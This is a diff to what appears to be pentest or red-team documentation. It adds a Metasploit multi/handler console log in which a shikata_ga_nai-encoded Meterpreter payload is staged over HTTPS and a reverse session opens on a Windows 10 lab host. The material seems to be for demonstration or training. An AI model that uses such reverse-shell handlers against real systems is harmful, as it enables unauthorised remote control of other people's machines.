@@ -24,6 +24,23 @@
 ## Scenario
 
 ```
+msf exploit(multi/handler) > 
+[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 1p4jbbka) Encoded stage with x86/shikata_ga_nai
+[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 1p4jbbka) Staging x86 payload (180854 bytes) ...
+[*] Meterpreter session 1 opened (192.168.0.30:443 -> 192.168.0.33:49775) at 2018-04-07 09:59:42 +0200
+
+msf exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  WIN10-01\user01 @ WIN10-01  192.168.0.30:443 -> 192.168.0.33:49775 (192.168.0.33)
+
 msf exploit(multi/handler) >
-[*]
+
+
+
+
 ```
